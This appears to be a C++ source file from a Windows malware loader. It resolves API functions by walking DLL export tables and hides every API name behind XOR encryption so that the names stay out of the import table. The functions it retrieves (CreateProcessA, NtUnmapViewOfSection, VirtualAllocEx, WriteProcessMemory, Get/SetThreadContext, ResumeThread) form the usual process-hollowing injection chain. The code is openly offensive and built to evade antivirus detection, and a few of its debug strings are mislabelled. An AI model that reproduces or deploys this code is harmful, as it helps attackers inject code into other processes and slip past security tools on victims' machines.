#include "hiddenImports.h"


PVOID WINAPI GetFunctionAddress(LPCTSTR lpDllName, LPCSTR lpFunctionName) {
    PPE_HEADERS ppehModuleHeaders;
    HMODULE hModule;
    PDWORD pdwAddress, pdwName;
    PWORD pwOrdinal;

    hModule = GetModuleHandle(lpDllName);

    if (!hModule)
        hModule = LoadLibrary(lpDllName);
    if(!hModule)
        return nullptr;

    ppehModuleHeaders = LoadPEHeaders((VIRTUAL_ADDRESS)hModule);
    if(ppehModuleHeaders->NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0)
        return nullptr;

    auto pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)hModule + ppehModuleHeaders->NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    pdwAddress = (PDWORD)((LPBYTE)hModule + pExportDirectory->AddressOfFunctions);
    pdwName = (PDWORD)((LPBYTE)hModule + pExportDirectory->AddressOfNames);

    pwOrdinal = (PWORD)((LPBYTE)hModule + pExportDirectory->AddressOfNameOrdinals);

    for(int i=0; i < pExportDirectory->AddressOfFunctions; i++) {
        if(!strcmp(lpFunctionName, (char*)hModule + pdwName[i])) {
            return (PVOID)((LPBYTE)hModule + pdwAddress[pwOrdinal[i]]);
        }
    }
    return nullptr;
}

PVOID WINAPI GetKernel32Function(LPCSTR lpFunctionName) {
    char encryptedKernel32[] = "\x0a\x07\x11\x0a\x00\x0a\x54\x5a\x47\x0e\x07\x0d";
    Xor(encryptedKernel32, 12, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    return GetFunctionAddress((LPCSTR)encryptedKernel32, lpFunctionName);
}

PVOID WINAPI GetNtDllFunction(LPCSTR lpFunctionName) {
    char encryptedNtDll[] = "\x0f\x16\x07\x08\x09\x48\x03\x04\x05";
    Xor(encryptedNtDll, 9, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    return GetFunctionAddress((LPCSTR)encryptedNtDll, lpFunctionName);
}

_CreateProcessA GetHiddenCreateProcessA() {
    DebugInfoMessage("Getting address of CreateProcessA");
    char encryptedCreateProcessA[] = "\x22\x10\x06\x05\x11\x03\x37\x1a\x06\x09\x0e\x12\x11\x22";
    Xor(encryptedCreateProcessA, 14, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenCreateProcessA = (_CreateProcessA)GetKernel32Function((LPCSTR)encryptedCreateProcessA);
    if (!HiddenCreateProcessA) {
        DebugErrorMessage("Failed to get address of CreateProcessA");
    } else {
        DebugData("Address of VirtualProtectEx", (VIRTUAL_ADDRESS) HiddenCreateProcessA, FORMAT_ADDRESS);
    }
    return HiddenCreateProcessA;
}

_NtUnmapViewOfSection GetHiddenNtUnmapViewOfSection() {
    DebugInfoMessage("Getting address of NtUnmapViewOfSection");
    char encryptedNtUnmapViewOfSection[] = "\x2f\x16\x36\x0a\x08\x07\x17\x3e\x00\x0f\x1c\x2e\x04\x30\x01\x06\x12\x0e\x07\x07";
    Xor(encryptedNtUnmapViewOfSection, 20, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenNtUnmapViewOfSection = (_NtUnmapViewOfSection) GetNtDllFunction((LPCSTR)encryptedNtUnmapViewOfSection);
    if (!HiddenNtUnmapViewOfSection) {
        DebugErrorMessage("Failed to get address of NtUnmapViewOfSection");
    } else {
        DebugData("Address of NtUnmapViewOfSection", (VIRTUAL_ADDRESS) HiddenNtUnmapViewOfSection, FORMAT_ADDRESS);
    }
    return HiddenNtUnmapViewOfSection;
}

_VirtualAllocEx GetHiddenVirtualAllocEx() {
    DebugInfoMessage("Getting address of VirtualAllocEx");
    char encryptedVirtualAllocEx[] = "\x37\x0b\x11\x10\x10\x07\x0b\x29\x05\x06\x04\x02\x27\x1b";
    Xor(encryptedVirtualAllocEx, 14, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenVirtualAllocEx = (_VirtualAllocEx)GetKernel32Function((LPCSTR)encryptedVirtualAllocEx);
    if (!HiddenVirtualAllocEx) {
        DebugErrorMessage("Failed to get address of VirtualAllocEx");
    } else {
        DebugData("Address of VirtualAllocEx", (VIRTUAL_ADDRESS) HiddenVirtualAllocEx, FORMAT_ADDRESS);
    }
    return HiddenVirtualAllocEx;
}

_WriteProcessMemory GetHiddenWriteProcessMemory() {
    DebugInfoMessage("Getting address of WriteProcessMemory");
    char encryptedWriteProcessMemory[] = "\x36\x10\x0a\x10\x00\x36\x15\x07\x0a\x0f\x18\x12\x2f\x06\x09\x0a\x14\x1e";
    Xor(encryptedWriteProcessMemory, 18, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenWriteProcessMemory = (_WriteProcessMemory)GetKernel32Function((LPCSTR)encryptedWriteProcessMemory);
    if (!HiddenWriteProcessMemory) {
        DebugErrorMessage("Failed to get address of WriteProcessMemory");
    } else {
        DebugData("Address of WriteProcessMemory", (VIRTUAL_ADDRESS) HiddenWriteProcessMemory, FORMAT_ADDRESS);
    }
    return HiddenWriteProcessMemory;
}

_VirtualProtectEx GetHiddenVirtualProtectEx() {
    DebugInfoMessage("Getting address of VirtualProtectEx");
    char encryptedVirtualProtectEx[] = "\x37\x0b\x11\x10\x10\x07\x0b\x38\x1b\x05\x1f\x04\x01\x17\x21\x1d";
    Xor(encryptedVirtualProtectEx, 16, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenVirtualProtectEx = (_VirtualProtectEx)GetKernel32Function((LPCSTR)encryptedVirtualProtectEx);
    if (!HiddenVirtualProtectEx) {
        DebugErrorMessage("Failed to get address of VirtualProtectEx");
    } else {
        DebugData("Address of VirtualProtectEx", (VIRTUAL_ADDRESS) HiddenVirtualProtectEx, FORMAT_ADDRESS);
    }
    return HiddenVirtualProtectEx;
}

_GetThreadContext GetHiddenGetThreadContext() {
    DebugInfoMessage("Getting address of GetThreadContext");
    char encryptedGetThreadContext[] = "\x26\x07\x17\x30\x0d\x14\x02\x09\x0d\x29\x04\x0f\x16\x06\x1c\x11";
    Xor(encryptedGetThreadContext, 16, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenGetThreadContext = (_GetThreadContext)GetKernel32Function((LPCSTR)encryptedGetThreadContext);
    if (!HiddenGetThreadContext) {
        DebugErrorMessage("Failed to get address of GetThreadContext");
    } else {
        DebugData("Address of GetThreadContext", (VIRTUAL_ADDRESS) HiddenGetThreadContext, FORMAT_ADDRESS);
    }
    return HiddenGetThreadContext;
}

_SetThreadContext GetHiddenSetThreadContext() {
    DebugInfoMessage("Getting address of SetThreadContext");
    char encryptedSetThreadContext[] = "\x32\x07\x17\x30\x0d\x14\x02\x09\x0d\x29\x04\x0f\x16\x06\x1c\x11";
    Xor(encryptedSetThreadContext, 16, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenSetThreadContext = (_SetThreadContext)GetKernel32Function((LPCSTR)encryptedSetThreadContext);
    if (!HiddenSetThreadContext) {
        DebugErrorMessage("Failed to get address of SetThreadContext");
    } else {
        DebugData("Address of SetThreadContext", (VIRTUAL_ADDRESS) HiddenSetThreadContext, FORMAT_ADDRESS);
    }
    return HiddenSetThreadContext;
}

_ResumeThread GetHiddenResumeThread() {
    DebugInfoMessage("Getting address of ResumeThread");
    char encryptedResumeThread[] = "\x33\x07\x10\x11\x08\x03\x33\x00\x1b\x0f\x0a\x05";
    Xor(encryptedResumeThread, 12, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto HiddenResumeThread = (_ResumeThread)GetKernel32Function((LPCSTR)encryptedResumeThread);
    if (!HiddenResumeThread) {
        DebugErrorMessage("Failed to get address of ResumeThread");
    } else {
        DebugData("Address of ResumeThread", (VIRTUAL_ADDRESS) HiddenResumeThread, FORMAT_ADDRESS);
    }
    return HiddenResumeThread;
}

_ReadProcessMemory GetReadProcessMemory() {
    DebugInfoMessage("Getting address of ReadProcessMemory");
    char encryptedReadProcessMemory[] = "\x33\x07\x02\x00\x35\x14\x08\x0b\x0c\x19\x18\x2c\x07\x0e\x0b\x17\x1f";
    Xor(encryptedReadProcessMemory, 17, IMPORTS_KEY, IMPORTS_KEY_LENGTH);
    auto ReadProcessMemory = (_ReadProcessMemory)GetKernel32Function((LPCSTR)encryptedReadProcessMemory);
    if (!ReadProcessMemory) {
        DebugErrorMessage("Failed to get address of ReadProcessMemory");
    } else {
        DebugData("Address of ReadProcessMemory", (VIRTUAL_ADDRESS) ReadProcessMemory, FORMAT_ADDRESS);
    }
    return ReadProcessMemory;
}